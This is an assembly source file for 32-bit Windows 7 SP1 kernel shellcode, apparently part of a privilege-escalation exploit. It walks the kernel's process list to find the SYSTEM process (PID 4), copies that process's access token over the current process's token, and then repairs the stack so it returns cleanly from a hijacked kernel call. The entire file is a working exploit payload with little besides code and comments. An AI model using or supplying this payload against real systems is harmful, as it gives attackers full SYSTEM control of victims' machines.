; nasm -f bin -o token_steal_kernel_win7_sp1.bin token_steal_kernel_win7_sp1.asm
; Windows 7 SP1 32bit

[bits 32]

section .text

WIN7_SP1_KTHREAD_OFFSET   equ 124h    ; nt!_KPCR.PcrbData.CurrentThread
WIN7_SP1_EPROCESS_OFFSET  equ 050h    ; nt!_KTHREAD.ApcState.Process
WIN7_SP1_PID_OFFSET       equ 0B4h    ; nt!_EPROCESS.UniqueProcessId
WIN7_SP1_FLINK_OFFSET     equ 0B8h    ; nt!_EPROCESS.ActiveProcessLinks.Flink
WIN7_SP1_TOKEN_OFFSET     equ 0F8h    ; nt!_EPROCESS.Token
WIN7_SP1_SYS_PID          equ 004h    ; SYSTEM Process PID

global _start

_start:

	; initialize
	pushad										  ; push all registers value on stack
	
	xor eax, eax								  ; Set zero
	mov eax, [fs:eax + WIN7_SP1_KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
	mov eax, [eax + WIN7_SP1_EPROCESS_OFFSET] 	  ; Get nt!_KTHREAD.ApcState.Process
	
	mov ecx, eax								  ; Copy current thread's _EPROCESS structure
	
	mov ebx, [eax + WIN7_SP1_TOKEN_OFFSET]     	  ; Copy current nt!_EPROCESS.Token
	mov edx, WIN7_SP1_SYS_PID			  		  ; WIN 7 SP1 SYSTEM Process PID = 4
 
SearchSystemPID:

	mov eax, [eax + WIN7_SP1_FLINK_OFFSET]		  ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
	sub eax, WIN7_SP1_FLINK_OFFSET
	cmp [eax + WIN7_SP1_PID_OFFSET], edx     	  ; Get nt!_EPROCESS.UniqueProcessId
	jne SearchSystemPID 
	
	mov edx, [eax + WIN7_SP1_TOKEN_OFFSET]	  	  ; Get SYSTEM process nt!_EPROCESS.Token
	mov [ecx + WIN7_SP1_TOKEN_OFFSET], edx     	  ; Replace current thread's nt!_EPROCESS.Token with SYSTEM
	
	popad										  ; Pop values from stack to registers
	; recovery
	
	xor eax, eax								  ; Set zero
	add esp, 0x110								  ; fix the stack
	pop ebp										  ; pop saved ebp
	ret											  ; return cleanly
	